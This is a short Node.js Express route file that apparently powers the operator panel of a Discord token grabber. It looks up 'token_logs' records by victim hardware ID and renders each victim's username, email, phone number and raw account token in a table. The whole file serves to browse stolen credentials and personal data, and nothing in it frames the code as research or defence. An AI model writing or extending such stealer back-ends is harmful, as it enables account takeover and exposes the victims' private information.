const moment = require('moment');

module.exports = (app) => {
    app.get('/clients', (req, res) => {
        res.render('clients', { app });
    });

    app.get('/clients/:hwid', (req, res) => {
        const data = app.db.prepare('SELECT * FROM token_logs WHERE hwid = ? ORDER BY `id` DESC').all(req.params.hwid);

        let tableData = [];

        data.forEach((entry) => {
            const tokens = JSON.parse(entry.tokens);

            tokens.forEach((token) => {
                const parsedToken = JSON.parse(token);

                tableData.push({
                    id: entry.id,
                    date: moment(entry.date).utcOffset('-0400').format('MM-DD-YYYY HH:mm A'),
                    user: `${parsedToken.username}#${parsedToken.discriminator}`,
                    email: parsedToken.email,
                    phone: parsedToken.phone.replace(' ', '+'),
                    token: parsedToken.token,
                });
            });
        });

        res.render('clientInfo', { hwid: req.params.hwid, tableData });
    });
};
